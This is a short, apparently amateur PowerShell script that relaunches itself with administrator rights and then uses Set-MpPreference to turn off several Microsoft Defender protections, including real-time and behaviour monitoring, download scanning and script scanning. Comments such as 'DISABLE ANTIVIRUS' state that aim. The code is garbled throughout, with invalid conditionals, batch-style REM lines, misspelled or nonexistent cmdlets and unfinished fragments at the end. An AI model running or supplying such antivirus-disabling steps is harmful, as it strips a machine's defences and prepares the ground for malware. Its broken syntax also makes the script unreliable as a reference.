
Function Check-RunAsAdministrator()
{
  #Get current user context
  $CurrentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
  
  #Check user is running the script is member of Administrator Group
  if($CurrentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator))
  {
       Write-host "Script is running with Administrator privileges!"
  }
  else
    {
       #Create a new Elevated process to Start PowerShell
       $ElevatedProcess = New-Object System.Diagnostics.ProcessStartInfo "PowerShell";
 
       # Specify the current script path and name as a parameter
       $ElevatedProcess.Arguments = "& '" + $script:MyInvocation.MyCommand.Path + "'"
 
       #Set the Process to elevated
       $ElevatedProcess.Verb = "runas"
 
       #Start the new elevated process
       [System.Diagnostics.Process]::Start($ElevatedProcess)
 
       #Exit from the current, unelevated, process
       Exit
 
    }
}
 
#Check Script is running with Elevated Privileges
Check-RunAsAdministrator
 
#Place your script here.
write-host


Get-MpComputerStatus
REM #check microsoft defender status


if (Set-MpPreference -DisableBehaviorMonitoring $false)
{
    Set-MpPreference -DisableBehaviorMonitoring $true
}
else
{
continue
}


if (Set-MpPreference -DisableRealtimeMonitor $false)
{
    Set-MpPreference -DisableRealtimeMonitor $true
}
else
{
continue
}
if (Set-MpPreference -DisableIOAVProtection $false)
{
    Set-MpPreference -DisableIOAVProtection $true
} 
else
{
continue
}
{
    
}
if (Set-MpPreference -DisableScriptScanning $false) 
{
    Set-MpPreference -DisableScriptScanning $true
}
else
{
continue
}


if(Set-MpPreference -DisableIOAVProtection == $true) 
{
    Set-MpPreference -DisableIOAVProtection $false
}
else
{
continue
}
if(Remove-MpThreat $true) 
{
    Remove-MpThreat $false
}
start remove-MpThreathreats
rem #DISABLE IOAV PROTECTION
if (-) Set AntivirusEnabled = False

rem #DISABLE ANTIVIRUS



rem #if defender is enabled, disable it




rem #if defender is disabled, update the 



REM #check if defender is enabled or not


REM #if defender is enabled, start a quick scan
if(MpComputerStatus    $true) {
    Start -MpWDOScan -ScanType QuickScan
}
else
{
if(MpComputerStatus $false) 
{
    Start -MpWDOScan -ScanType QuickScan
}
else
{
continue
}
}
REM #if defender is disabled, start a quick scan





REM #remove t







